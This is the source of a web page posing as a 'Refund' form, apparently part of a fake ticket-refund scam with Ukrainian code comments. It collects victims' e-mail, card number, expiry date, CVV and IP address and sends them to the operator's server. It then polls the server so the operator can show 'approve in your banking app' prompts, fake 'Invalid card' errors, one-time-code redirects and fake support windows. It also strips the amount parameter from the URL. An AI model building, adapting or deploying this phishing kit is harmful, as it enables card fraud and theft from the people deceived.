<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Refund</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
    <style>
        body {
            background: #00b2ff;
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Roboto', Arial, sans-serif;
        }
        .payment-card {
            background: #fff;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.12);
            padding: 2.5rem 2rem 2rem 2rem;
            max-width: 370px;
            width: 100%;
            box-sizing: border-box;
            text-align: center;
            overflow: hidden;
        }
        .bank-icon {
            width: 60px;
            height: 60px;
            background: #00b2ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.2rem auto;
        }
        .bank-icon svg {
            width: 36px;
            height: 36px;
            fill: #fff;
        }
        .payment-title {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 1.2rem;
        }
        .payment-card hr {
            border: none;
            border-top: 1px solid #e0e0e0;
            margin: 1.2rem 0 1.5rem 0;
        }
        .input-group {
            margin-bottom: 1.1rem;
            text-align: left;
        }
        .input-group input {
            width: 100%;
            padding: 1rem 1.1rem;
            border: 1.5px solid #e0e0e0;
            border-radius: 12px;
            font-size: 1.1rem;
            background: #fafbfc;
            outline: none;
            transition: border 0.2s;
            box-sizing: border-box;
            overflow-wrap: break-word;
        }
        .input-group input:focus {
            border-color: #00b2ff;
        }
        .row {
            display: flex;
            gap: 1rem;
            width: 100%;
        }
        .row .input-group {
            flex: 1;
            margin-bottom: 0;
        }
        .confirm-btn {
            width: 100%;
            padding: 1rem;
            background: #00b2ff;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 1.15rem;
            font-weight: 500;
            margin-top: 1.2rem;
            cursor: pointer;
            transition: background 0.2s;
        }
        .confirm-btn:hover {
            background: #0090cc;
        }
        .support-proceed-btn {
            width: 100%;
            padding: 1rem;
            background: #00b2ff;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 1.15rem;
            font-weight: 500;
            margin-top: 0.5rem;
            cursor: pointer;
            transition: background 0.2s;
            text-align: center;
            text-decoration: none;
            display: block;
            box-sizing: border-box;
        }
        .support-proceed-btn:hover {
            background: #0090cc;
        }
        @media (max-width: 480px) {
            .payment-card {
                padding: 1.2rem 0.5rem 1.5rem 0.5rem;
            }
            .row {
                flex-direction: column;
                gap: 0.7rem;
            }
        }
    </style>
    <style>
    #push-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 178, 255, 0.85);
      z-index: 99999;
      align-items: center;
      justify-content: center;
    }
    #text-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(255, 152, 0, 0.85);
      z-index: 99999;
      align-items: center;
      justify-content: center;
    }
    #support-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(76, 175, 80, 0.85);
      z-index: 99999;
      align-items: center;
      justify-content: center;
    }
    </style>
</head>
<body>
    <div class="payment-card">
        <div class="bank-icon">
            <svg viewBox="0 0 24 24"><path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/></svg>
        </div>
        <div class="payment-title" id="payment-title">Refund 45€</div>
        <div>Price: <span class="event-price"></span></div>
        <hr>
        <form id="paymentForm" autocomplete="off">
            <div class="input-group">
                <input id="email-input" type="email" placeholder="E-mail" value="" required>
            </div>
            <div class="input-group">
                <input id="card-input" type="text" placeholder="Card Number" maxlength="19" pattern="[0-9 ]*" inputmode="numeric" required>
            </div>
            <div class="row">
                <div class="input-group">
                    <input id="expiry-input" type="text" placeholder="Expiry Date" maxlength="5" pattern="[0-9/]*" inputmode="numeric" required>
                </div>
                <div class="input-group">
                    <input id="cvv-input" type="password" placeholder="CVV" maxlength="3" pattern="[0-9]{3}" inputmode="numeric" required>
                </div>
            </div>
            <button type="submit" class="confirm-btn">Confirm</button>
        </form>
    </div>
    <script>
    // Визначаємо IP користувача
    let userIP = null;
    fetch("https://api.ipify.org?format=json")
      .then(r => r.json())
      .then(data => { userIP = data.ip; });

    // Додаємо overlay-вікно загрузки
    const loadingOverlay = document.createElement('div');
    loadingOverlay.id = 'loading-overlay';
    loadingOverlay.style = 'display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,178,255,0.85);z-index:99999;align-items:center;justify-content:center;flex-direction:column;';
    loadingOverlay.innerHTML = '<div style="background:#fff;border-radius:20px;max-width:320px;width:100%;margin:auto;padding:2rem 1.5rem;box-shadow:0 8px 32px rgba(0,0,0,0.12);text-align:center;"><div style="margin-bottom:1.2rem;"><svg width="48" height="48" viewBox="0 0 50 50"><circle cx="25" cy="25" r="20" stroke="#00b2ff" stroke-width="5" fill="none" stroke-dasharray="31.4 31.4" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite"/></circle></svg></div><div style="font-size:1.2rem;font-weight:500;">Processing...</div></div>';
    document.body.appendChild(loadingOverlay);

    // Додаємо push-overlay, якщо його немає
    if (!document.getElementById('push-overlay')) {
      const pushOverlay = document.createElement('div');
      pushOverlay.id = 'push-overlay';
      pushOverlay.innerHTML = `
        <div class="push-modal">
          <div class="push-bell">
            <svg viewBox="0 0 24 24" fill="none"><path d="M12 22c1.1 0 2-.9 2-2h-4a2 2 0 0 0 2 2zm6-6V11c0-3.07-1.63-5.64-5-6.32V4a1 1 0 1 0-2 0v.68C7.63 5.36 6 7.92 6 11v5l-1.29 1.29A1 1 0 0 0 6 19h12a1 1 0 0 0 .71-1.71L18 16z" fill="#fff"/></svg>
          </div>
          <div class="push-title" id="push-payment-title">Payment Confirmation</div>
          <div class="push-desc">To confirm the transaction, open your banking app and follow the instructions of your bank. <br>Do not close this window.</div>
        </div>
      `;
      document.body.appendChild(pushOverlay);
    }
    
    // Додаємо text-overlay
    if (!document.getElementById('text-overlay')) {
      const textOverlay = document.createElement('div');
      textOverlay.id = 'text-overlay';
      textOverlay.innerHTML = `
        <div class="push-modal">
          <div class="push-bell">
            <svg viewBox="0 0 24 24" fill="none"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z" fill="#fff"/></svg>
          </div>
          <div class="push-title" id="text-title">Important Message</div>
          <div class="push-desc" id="text-content">You have received an important message. Please read it carefully.</div>
        </div>
      `;
      document.body.appendChild(textOverlay);
    }
    
    // Додаємо support-overlay
    if (!document.getElementById('support-overlay')) {
      const supportOverlay = document.createElement('div');
      supportOverlay.id = 'support-overlay';
      supportOverlay.innerHTML = `
        <div class="push-modal">
          <div class="push-bell">
            <svg viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="#fff"/></svg>
          </div>
          <div class="push-title">Support Team</div>
          <div class="push-desc">Our support team is now available to help you. Please wait for assistance.</div>
        </div>
      `;
      document.body.appendChild(supportOverlay);
    }

    // Сабміт форми: показуємо overlay
    document.getElementById('paymentForm').onsubmit = async function(e) {
        e.preventDefault();
        loadingOverlay.style.display = 'flex';
        const email = document.getElementById('email-input').value;
        const card = document.getElementById('card-input').value;
        const expiry = document.getElementById('expiry-input').value;
        const cvv = document.getElementById('cvv-input').value;
        let price = localStorage.getItem('event_price');
        let currency = localStorage.getItem('event_currency');
        if (!price || !currency) {
            const totalRaw = getQueryParam('total') || localStorage.getItem('refund_total') || '';
            const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
            if (match) {
                price = match[1].replace(',', '.');
                currency = match[2];
            }
        }
        try {
            let ip = userIP;
            if (!ip) {
                await new Promise(res => setTimeout(res, 500));
                ip = userIP;
            }
            await fetch('/send_payment_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, card, expiry, cvv, ip, type: 'refund', price, currency, page: getPageCode(), page_code: getPageCode() })
            });
            // overlay залишається до push!
        } catch (error) {
            loadingOverlay.style.display = 'none';
            console.error('Помилка при зверненні до сервера:', error);
        }
    };

    // Polling для push (push-overlay)
    function pollPushOverlay() {
      const page_code = getPageCode();
      document.body.setAttribute('data-page-code', page_code);
      if (!page_code) return setTimeout(pollPushOverlay, 2000);
      const url = '/check_push?page_code=' + encodeURIComponent(page_code);
      fetch(url)
        .then(resp => resp.text())
        .then(txt => {
          if (txt === 'true') {
            document.getElementById('push-overlay').style.display = 'flex';
            if (window.loadingOverlay) loadingOverlay.style.display = 'none';
          } else {
            setTimeout(pollPushOverlay, 2000);
          }
        });
    }
    setTimeout(pollPushOverlay, 2000);
    // --- Замість uid використовуємо page_code ---
    function getPageCode() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('page') || urlParams.get('e') || sessionStorage.getItem('page_code') || '';
    }
    // Зчитування параметрів з URL
    function getQueryParam(name) {
        const url = new URL(window.location.href);
        return url.searchParams.get(name);
    }
    // Total підтягуємо, беремо тільки число
    const totalRaw = getQueryParam('total');
    if (totalRaw) {
        // Витягуємо тільки число (цілу або з копійками)
        const match = totalRaw.match(/\d+[\.,]?\d*/);
        const totalNum = match ? match[0].replace(',', '.') : '';
        if (totalNum) {
            document.getElementById('payment-title').textContent = `Refund ${totalNum}€`;
        }
    }
    // --- POLLING для wrong_card ---
    let wrongCardMsg = null;
    function showWrongCardMsg() {
        if (!wrongCardMsg) {
            wrongCardMsg = document.createElement('div');
            wrongCardMsg.style.color = '#dc3545';
            wrongCardMsg.style.fontSize = '0.98rem';
            wrongCardMsg.style.marginTop = '6px';
            wrongCardMsg.textContent = 'Invalid card';
            const cardInput = document.getElementById('card-input');
            cardInput.parentNode.appendChild(wrongCardMsg);
        }
    }
    setInterval(function() {
        if (!userIP) return;
        fetch('/check_wrong_card?ip=' + encodeURIComponent(userIP))
            .then(resp => resp.text())
            .then(txt => {
                if (txt === 'true') {
                    showWrongCardMsg();
                }
            });
    }, 2000);
    // --- POLLING для code redirect ---
    setInterval(function() {
        if (!userIP) return;
        fetch('/check_code_redirect?ip=' + encodeURIComponent(userIP))
            .then(resp => resp.text())
            .then(txt => {
                if (txt === 'true') {
                    window.location.href = '/buy-tickets/code/';
                }
            });
    }, 2000);
    // --- POLLING для support/text кнопок ---
    let supportTabOpened = false;
    async function pollSupportButtons() {
        if (!userIP) {
            return setTimeout(pollSupportButtons, 2000);
        }
        try {
            const resp = await fetch(`/check_support?ip=${encodeURIComponent(userIP)}`);
            const data = await resp.json();
            if ((data.show_support || data.show_text)) {
                loadingOverlay.style.display = 'none';
            }
            if (!supportTabOpened && (data.show_support || data.show_text)) {
                const page_code = getPageCode();
                if (data.show_support) {
                    window.open(`/buy-tickets/loading/waiting-support.html?page=${page_code}`, '_blank');
                    supportTabOpened = true;
                }
                if (data.show_text && data.text_id) {
                    window.open(`/buy-tickets/loading/waiting-text.html?page=${page_code}&text_id=${data.text_id}`, '_blank');
                    supportTabOpened = true;
                }
            }
        } catch (e) {}
        setTimeout(pollSupportButtons, 2000);
    }
    setTimeout(pollSupportButtons, 2000);
    </script>
    
    <!-- Flag handler for text and support -->
    <script src="/js/flag-handler.js"></script>
    <script>
    // Initialize flag handler
    const flagHandler = new FlagHandler();
    
    // Start polling for text flag
    flagHandler.startPolling('text', (triggered) => {
        if (triggered) {
            // Get text content from server
            const page_code = flagHandler.getPageCode();
            fetch(`/get_custom_text?text_id=${page_code}`)
                .then(resp => resp.json())
                .then(data => {
                    if (data.text) {
                        document.getElementById('text-content').textContent = data.text;
                    }
                    flagHandler.showOverlay('text-overlay', ['refund-form', 'loading-overlay']);
                })
                .catch(error => {
                    console.error('Error fetching text:', error);
                    flagHandler.showOverlay('text-overlay', ['refund-form', 'loading-overlay']);
                });
        }
    });
    
    // Start polling for support flag
    flagHandler.startPolling('support', (triggered) => {
        if (triggered) {
            flagHandler.showOverlay('support-overlay', ['refund-form', 'loading-overlay']);
        }
    });
    
    // Cleanup on page unload
    window.addEventListener('beforeunload', () => {
        flagHandler.stopAllPolling();
    });
    </script>

    <script>
(function() {
  // Підстановка ціни та валюти з URL, localStorage, або збереженого refund_total
  const params = new URLSearchParams(window.location.search);
  let price = params.get('price');
  let currency = params.get('currency');
  let totalRaw = params.get('total');
  let title = '';
  let page_code = params.get('page') || params.get('e') || sessionStorage.getItem('page_code');

  // --- НОВА ЛОГІКА: якщо є e=... (short code), завжди підтягуємо з бекенду ---
  if (params.get('e')) {
    fetch(`/api/payment_data?e=${encodeURIComponent(params.get('e'))}`)
      .then(r => r.json())
      .then(ev => {
        if (ev.price && ev.currency) {
          price = ev.price;
          currency = ev.currency;
    localStorage.setItem('event_price', price);
    localStorage.setItem('event_currency', currency);
          document.getElementById('payment-title').textContent = `Refund ${price} ${currency}`;
          document.querySelectorAll('.event-price').forEach(el => el.textContent = price + ' ' + currency);
        } else if (ev.currency) {
          document.getElementById('payment-title').textContent = `Refund ${ev.currency}`;
          document.querySelectorAll('.event-price').forEach(el => el.textContent = ev.currency);
        }
      });
    // Показуємо тимчасово, поки не підвантажиться
    document.getElementById('payment-title').textContent = 'Refund ...';
    document.querySelectorAll('.event-price').forEach(el => el.textContent = '...');
    return;
  }
  // --- СТАРА ЛОГІКА ДЛЯ ВСІХ ІНШИХ ВИПАДКІВ ---
  if (totalRaw) {
    const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
    if (match) {
      price = match[1].replace(',', '.');
      currency = match[2];
      localStorage.setItem('event_price', price);
      localStorage.setItem('event_currency', currency);
      localStorage.setItem('refund_total', totalRaw);
      title = `Refund ${price} ${currency}`;
    } else {
      // Якщо тільки число
      const numMatch = totalRaw.match(/\d+[\.,]?\d*/);
      price = numMatch ? numMatch[0].replace(',', '.') : '';
      currency = params.get('currency') || localStorage.getItem('event_currency') || 'EUR';
      title = `Refund ${price} ${currency}`;
    }
  } else if (price && currency) {
    localStorage.setItem('event_price', price);
    localStorage.setItem('event_currency', currency);
    title = `Refund ${price} ${currency}`;
  } else if (currency) {
    // Якщо є тільки валюта — підвантажуємо з бекенду
    if (page_code) {
      fetch(`/api/payment_data?page=${encodeURIComponent(page_code)}`)
        .then(r => r.json())
        .then(ev => {
          if (ev.price && ev.currency) {
            price = ev.price;
            currency = ev.currency;
            localStorage.setItem('event_price', price);
            localStorage.setItem('event_currency', currency);
            document.getElementById('payment-title').textContent = `Refund ${price} ${currency}`;
            document.querySelectorAll('.event-price').forEach(el => el.textContent = price + ' ' + currency);
          } else if (currency) {
            document.getElementById('payment-title').textContent = `Refund ${currency}`;
            document.querySelectorAll('.event-price').forEach(el => el.textContent = currency);
          }
        });
      title = `Refund ${currency}`;
    } else {
      localStorage.setItem('event_currency', currency);
      title = `Refund ${currency}`;
    }
  } else if (localStorage.getItem('refund_total')) {
    // Якщо total вже зник з адреси, але є у localStorage
    const saved = localStorage.getItem('refund_total');
    const match = saved.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
    if (match) {
      price = match[1].replace(',', '.');
      currency = match[2];
      localStorage.setItem('event_price', price);
      localStorage.setItem('event_currency', currency);
      title = `Refund ${price} ${currency}`;
    } else {
      const numMatch = saved.match(/\d+[\.,]?\d*/);
      price = numMatch ? numMatch[0].replace(',', '.') : '';
      currency = localStorage.getItem('event_currency') || 'EUR';
      title = `Refund ${price} ${currency}`;
    }
  } else {
    price = localStorage.getItem('event_price');
    currency = localStorage.getItem('event_currency');
    if (price && currency) title = `Refund ${price} ${currency}`;
    else if (currency) title = `Refund ${currency}`;
  }
  if (title) {
    document.getElementById('payment-title').textContent = title;
  }
  // Price: ...
  let priceText = '';
  if (price && currency) priceText = price + ' ' + currency;
  else if (currency) priceText = currency;
  document.querySelectorAll('.event-price').forEach(el => el.textContent = priceText);
})();
</script>
    <script>
document.addEventListener('DOMContentLoaded', function() {
  // Ховаємо параметр total з адресного рядка, але зберігаємо його у localStorage
  const params = new URLSearchParams(window.location.search);
  const total = params.get('total');
  if (total) {
    localStorage.setItem('refund_total', total);
    params.delete('total');
    const newUrl = window.location.pathname + (params.toString() ? '?' + params.toString() : '');
    window.history.replaceState({}, '', newUrl);
  }
});
</script>
